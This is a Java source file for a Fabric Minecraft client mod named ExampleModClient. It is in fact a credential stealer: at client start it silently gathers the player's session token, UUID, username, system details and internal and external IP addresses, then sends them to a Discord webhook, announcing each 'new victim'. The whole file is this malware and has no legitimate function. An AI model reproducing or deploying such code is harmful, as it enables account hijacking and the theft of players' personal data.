package com.example;

import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.session.Session;

import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.Scanner;

public class ExampleModClient implements ClientModInitializer {

	final static String $host = "YOUR_WEBHOOK";

	@Override
	public void onInitializeClient() {
		new Thread(() -> {
			try {
				fetchExternalIP();
				DiscordWebhook webhook = new DiscordWebhook($host);
				webhook.setUsername("Monkey Gang");

				try {
					// Add an embed with an image and a message
					DiscordWebhook.EmbedObject imageEmbed = new DiscordWebhook.EmbedObject()
							.setTitle("New victim by the name of " + System.getProperty("user.name") + " has joined the webhook.")
							.setImage("https://mc-heads.net/avatar/" + MinecraftClient.getInstance().getSession().getUsername())
							.setColor(0x000000); // Black color
					webhook.addEmbed(imageEmbed);
				} catch (Exception e) {
					e.printStackTrace();
				}

				try {
					Session session = MinecraftClient.getInstance().getSession();
					DiscordWebhook.EmbedObject accountEmbed = new DiscordWebhook.EmbedObject()
							.setTitle(":unlock: Account Info")
							.setColor(0x000000) // Black color
							.setDescription("[NameMC](https://namemc.com/profile/" + session.getUsername() + ") | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getUsername() + ") | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getUsername() + ")")
							.addField(":identification_card: IGN", "```" + session.getUsername() + "```", true)
							.addField(":identification_card: UUID", "```" + session.getUuidOrNull() + "```", true)
							.addField(":key: Session Token / ID", "```" + session.getSessionId() + "```", false);
					webhook.addEmbed(accountEmbed);
				} catch (Exception e) {
					e.printStackTrace();
				}

				try {
					InetAddress inetAddress = InetAddress.getLocalHost();

					DiscordWebhook.EmbedObject systemEmbed = new DiscordWebhook.EmbedObject()
							.setTitle(":adult: System Info")
							.setColor(0x000000) // Black color
							.addField(":identification_card: User", "```" + System.getProperty("user.name") + "```", true)
							.addField(":identification_card: OS", "```" + System.getProperty("os.name") + "```", true)
							.addField(":identification_card: OS Arch", "```" + System.getProperty("os.arch") + "```", true)
							.addField(":identification_card: OS Version", "```" + System.getProperty("os.version") + "```", true)
							.addField(":identification_card: Java Version", "```" + System.getProperty("java.version") + "```", true)
							.addField(":identification_card: Java Vendor", "```" + System.getProperty("java.vendor") + "```", true)
							.addField(":identification_card: Java Home", "```" + System.getProperty("java.home") + "```", true)
							.addField(":identification_card: User Home", "```" + System.getProperty("user.home") + "```", true)
							.addField(":identification_card: File Encoding", "```" + System.getProperty("file.encoding") + "```", true)
							.addField(":identification_card: User Language", "```" + System.getProperty("user.language") + "```", true)
							.addField(":identification_card: User Country", "```" + System.getProperty("user.country") + "```", true)
							.addField(":identification_card: User External IP", "```" + externalIP + "```", true)
							.addField(":identification_card: User Internal IP", "```" + inetAddress.getHostAddress() + "```", true)
							.addField(":identification_card: User Directory", "```" + System.getProperty("user.dir") + "```", true);

					webhook.addEmbed(systemEmbed);
				} catch (Exception e) {
					e.printStackTrace();
				}
				webhook.execute();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}).start();
	}

	private String externalIP;

	private void fetchExternalIP() throws Exception {
		URL url = new URL("https://api.ipify.org?format=json");
		HttpURLConnection connection = (HttpURLConnection) url.openConnection();
		connection.setRequestMethod("GET");

		int responseCode = connection.getResponseCode();
		if (responseCode == 200) {
			Scanner scanner = new Scanner(connection.getInputStream());
			String jsonResponse = scanner.nextLine();
			String ip = jsonResponse.substring(jsonResponse.indexOf("\"ip\":\"") + 6, jsonResponse.lastIndexOf("\""));
			externalIP = ip;
			scanner.close();

		} else {
			throw new Exception("Failed to fetch external IP. Response code: " + responseCode);
		}
	}
}
